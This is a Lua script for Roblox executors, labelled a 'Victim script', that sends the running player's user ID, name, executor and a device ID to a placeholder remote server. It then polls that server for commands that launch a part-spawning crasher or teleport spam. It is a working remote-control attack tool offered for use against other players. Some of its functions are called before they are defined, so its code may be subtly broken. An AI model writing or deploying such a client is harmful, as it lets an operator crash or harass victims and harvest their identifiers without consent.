-- ========================================================================
-- LOADER.LUA – Victim script (hosted on your website)
-- ========================================================================

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")
local LP = Players.LocalPlayer

-- ========== CONFIG ==========
-- CHANGE THIS TO YOUR DEPLOYED WEBSITE URL (e.g., https://your-project.glitch.me)
local API_BASE = "https://YOUR-WEBSITE-URL.com"

-- ========== DETECT EXECUTOR ==========
local executor = "Unknown"
if syn and syn.crypt then executor = "Synapse"
elseif krnl and krnl.load then executor = "Krnl"
elseif getexecutorname then executor = getexecutorname()
elseif gethui then executor = "Delta"
end

local deviceId = HttpService:GenerateGUID(false)

-- ========== REGISTER WITH WEBSITE ==========
local function register()
    local data = {
        userId = tostring(LP.UserId),
        userName = LP.Name,
        executor = executor,
        deviceId = deviceId
    }
    pcall(function()
        HttpService:PostAsync(API_BASE .. "/api/register",
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson)
        print("[Admin] ✅ Registered: " .. LP.Name)
    end)
end

-- ========== HEARTBEAT & POLL ==========
local function heartbeat()
    pcall(function()
        HttpService:PostAsync(API_BASE .. "/api/heartbeat",
            HttpService:JSONEncode({ userId = tostring(LP.UserId) }),
            Enum.HttpContentType.ApplicationJson)
    end)
end

local function pollCommands()
    local success, res = pcall(function()
        return HttpService:GetAsync(API_BASE .. "/api/poll?userId=" .. LP.UserId)
    end)
    if success and res then
        local data = HttpService:JSONDecode(res)
        local cmd = data and data.command
        if cmd then
            print("[Admin] 📨 Command: " .. cmd)
            if cmd == "tp_start" then startTPSpam()
            elseif cmd == "tp_stop" then stopTPSpam()
            elseif cmd == "crash" then startCrash()
            elseif cmd == "stop_crash" then stopCrash() end
            -- Update state on website
            pcall(function()
                HttpService:PostAsync(API_BASE .. "/api/state",
                    HttpService:JSONEncode({ userId = tostring(LP.UserId), tpActive = tpActive, crashActive = crashActive }),
                    Enum.HttpContentType.ApplicationJson)
            end)
        end
    end
end

-- ========== CRASHER ==========
local crashActive = false
local function startCrash()
    if crashActive then return end
    crashActive = true
    task.spawn(function()
        while crashActive do
            for i = 1, 200 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(8, 8, 8)
                part.Position = Vector3.new(math.random(-3000,3000), math.random(-200,500), math.random(-3000,3000))
                part.Anchored = false
                part.Material = Enum.Material.Neon
                part.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                part.Parent = Workspace
                task.delay(0.1, function() pcall(function() part:Destroy() end) end)
            end
            task.wait()
        end
    end)
    print("[Admin] 💀 CRASH ACTIVATED")
end
local function stopCrash()
    crashActive = false
    print("[Admin] ✅ CRASH STOPPED")
end

-- ========== TP SPAM ==========
local tpActive = false
local function tpDown()
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {char}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    local result = Workspace:Raycast(root.Position, Vector3.new(0, -500, 0), params)
    local targetY = result and (result.Position.Y + 2.5) or (root.Position.Y - 175)
    root.CFrame = CFrame.new(root.Position.X, targetY, root.Position.Z)
end
local function tpUp()
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    root.CFrame = CFrame.new(root.Position + Vector3.new(0, 8.7, 0))
end
local function startTPSpam()
    if tpActive then return end
    tpActive = true
    task.spawn(function()
        while tpActive do
            local char = LP.Character
            if char then
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then
                    root.Velocity = Vector3.new(root.Velocity.X, 52, root.Velocity.Z)
                    task.wait(0.08)
                    root.Velocity = Vector3.new(root.Velocity.X, 52, root.Velocity.Z)
                    task.wait(0.1)
                    tpUp()
                    task.wait(0.18)
                    tpDown()
                    task.wait(0.15)
                end
            end
            task.wait()
        end
    end)
    print("[Admin] 🔄 TP SPAM ACTIVATED")
end
local function stopTPSpam()
    tpActive = false
    print("[Admin] ✅ TP SPAM STOPPED")
end

-- ========== START ==========
register()
task.wait(1)
task.spawn(function()
    while true do
        task.wait(2)
        heartbeat()
        pollCommands()
    end
end)
print("[Admin] 📡 Loader active. Polling for commands...")